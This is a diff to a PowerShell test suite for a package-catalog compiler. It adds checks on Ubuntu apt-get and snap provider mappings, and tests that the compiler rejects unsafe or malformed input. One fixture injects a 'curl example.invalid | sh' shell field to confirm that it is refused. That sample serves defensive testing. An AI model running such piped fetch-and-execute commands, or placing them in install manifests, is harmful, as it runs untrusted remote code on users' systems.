@@ -120,6 +120,27 @@ try {
         }
     }
 
+    $ubuntuMappings = @($packagesV2.packages | Where-Object { $null -ne (Get-OptionalValue $_.platforms 'ubuntu') })
+    Assert-True ($ubuntuMappings.Count -eq 11) 'The first Ubuntu compatibility slice must classify all 11 core packages.'
+    Assert-True (@($ubuntuMappings | Where-Object { $_.platforms.ubuntu.support -eq 'unsupported' }).Count -eq 1) 'Exactly one bounded core package must remain explicitly unsupported.'
+    $githubCompiled = $packagesV3.packages | Where-Object { $_.id -eq 'github-cli' } | Select-Object -First 1
+    Assert-True ($null -eq (Get-OptionalValue $githubCompiled.providers 'ubuntu')) 'Unsupported GitHub CLI must not compile into an unsafe Ubuntu provider.'
+    $expectedUbuntuProviders = [ordered]@{
+        'git' = @('apt-get', 'git'); 'vscode' = @('snap', 'code'); 'powershell' = @('snap', 'powershell')
+        'windows-terminal' = @('apt-get', 'gnome-terminal'); 'seven-zip' = @('apt-get', '7zip')
+        'jq' = @('apt-get', 'jq'); 'ripgrep' = @('apt-get', 'ripgrep'); 'fd' = @('apt-get', 'fd-find')
+        'git-lfs' = @('apt-get', 'git-lfs'); 'openssl' = @('apt-get', 'openssl')
+    }
+    foreach ($entry in $expectedUbuntuProviders.GetEnumerator()) {
+        $compiled = $packagesV3.packages | Where-Object { $_.id -eq $entry.Key } | Select-Object -First 1
+        $provider = @($compiled.providers.ubuntu)[0]
+        Assert-True ($provider.manager -eq $entry.Value[0] -and $provider.packageId -eq $entry.Value[1]) "Package '$($entry.Key)' has an unexpected Ubuntu provider."
+        Assert-True ($provider.privilege -eq 'elevated' -and $provider.scope -eq 'machine') "Package '$($entry.Key)' Ubuntu provider must use elevated machine scope."
+        $expectedArchitectures = if ($provider.manager -eq 'snap') { 'x64' } else { 'x64,arm64' }
+        Assert-True (($provider.architectures -join ',') -eq $expectedArchitectures) "Package '$($entry.Key)' Ubuntu architectures changed."
+        Assert-True ($provider.detection.type -eq 'manager-native') "Package '$($entry.Key)' Ubuntu detection must be manager-native."
+    }
+
     Assert-True (($profilesV3.corePackageIds -join ',') -eq ($profilesV2.corePackages -join ',')) 'Core package order changed during compilation.'
     foreach ($sourcePackProperty in @($profilesV2.packs.PSObject.Properties)) {
         $compiled = $profilesV3.packs | Where-Object { $_.id -eq $sourcePackProperty.Name } | Select-Object -First 1
@@ -154,6 +175,24 @@ try {
     try { & $compilerPath -PackagesPath $quotedOverridePath -ProfilesPath $profilesV2Path -OutputDirectory (Join-Path $tempRoot 'quoted-output') | Out-Null }
     catch { $quotedOverrideRejected = $_.Exception.Message -match 'requires explicit schema-v3 migration' }
     Assert-True $quotedOverrideRejected 'Compiler must reject ambiguous quoted legacy overrides.'
+
+    $unsafeUbuntuCatalog = Get-Content -LiteralPath $packagesV2Path -Raw -Encoding UTF8 | ConvertFrom-Json
+    $unsafeUbuntuCatalog.packages[0].platforms.ubuntu | Add-Member -NotePropertyName shell -NotePropertyValue 'curl example.invalid | sh'
+    $unsafeUbuntuPath = Join-Path $tempRoot 'unsafe-ubuntu.json'
+    Write-Utf8Json -Value $unsafeUbuntuCatalog -Path $unsafeUbuntuPath
+    $unsafeUbuntuRejected = $false
+    try { & $compilerPath -PackagesPath $unsafeUbuntuPath -ProfilesPath $profilesV2Path -OutputDirectory (Join-Path $tempRoot 'unsafe-ubuntu-output') | Out-Null }
+    catch { $unsafeUbuntuRejected = $_.Exception.Message -match "unsupported field 'shell'" }
+    Assert-True $unsafeUbuntuRejected 'Compiler must reject arbitrary shell fields in Ubuntu compatibility mappings.'
+
+    $stringOptionsCatalog = Get-Content -LiteralPath $packagesV2Path -Raw -Encoding UTF8 | ConvertFrom-Json
+    $stringOptionsCatalog.packages[0].platforms.ubuntu.installOptions = '--classic'
+    $stringOptionsPath = Join-Path $tempRoot 'string-options.json'
+    Write-Utf8Json -Value $stringOptionsCatalog -Path $stringOptionsPath
+    $stringOptionsRejected = $false
+    try { & $compilerPath -PackagesPath $stringOptionsPath -ProfilesPath $profilesV2Path -OutputDirectory (Join-Path $tempRoot 'string-options-output') | Out-Null }
+    catch { $stringOptionsRejected = $_.Exception.Message -match 'installOptions must be a typed array' }
+    Assert-True $stringOptionsRejected 'Compiler must reject stringly typed Ubuntu installer options.'
 
     $compiledText = Get-Content -LiteralPath $resultOne.PackageCatalog -Raw -Encoding UTF8
     Assert-True ($compiledText -notmatch 'wingetOverride|installStrategy') 'Compiled v3 catalog must not retain raw v2 execution fields.'
